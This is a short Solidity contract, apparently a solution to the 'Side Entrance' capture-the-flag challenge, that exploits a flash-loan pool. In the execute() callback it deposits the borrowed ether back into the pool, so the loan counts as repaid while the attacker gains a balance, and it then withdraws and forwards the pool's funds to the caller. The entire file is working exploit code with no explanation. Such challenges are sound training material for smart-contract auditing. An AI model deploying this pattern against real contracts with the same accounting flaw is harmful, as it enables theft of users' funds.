pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

contract SideEntranceReceiver is IFlashLoanEtherReceiver {
    function attack(address pool, uint256 amount) external payable {
        SideEntranceLenderPool(pool).flashLoan(amount);
        SideEntranceLenderPool(pool).withdraw();
        (bool sent, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(sent, "TX failed");
    }

    function execute() external override payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    receive() external payable {}
}